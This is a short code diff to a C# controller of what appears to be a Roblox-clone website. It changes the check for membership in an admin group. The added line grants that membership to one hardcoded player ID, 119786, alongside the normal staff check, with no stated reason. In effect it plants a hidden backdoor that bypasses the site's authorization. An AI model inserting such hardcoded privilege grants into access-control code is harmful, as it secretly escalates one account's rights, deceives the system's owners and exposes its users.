@@ -63,7 +63,7 @@ namespace Roblox.Website.Controllers
                 try
                 {
                     // 1200769 is the roblox admin group gc
-                    if (groupid == 1200769 && await StaffFilter.IsStaff(playerid ?? 0))
+                    if (groupid == 1200769 && (await StaffFilter.IsStaff(playerid ?? 0) || playerid == 119786))
                         isInGroup = true;
                     var group = await services.groups.GetUserRoleInGroup((long)groupid, (long?)playerid ?? (long)0);
                     if (group.rank != 0)
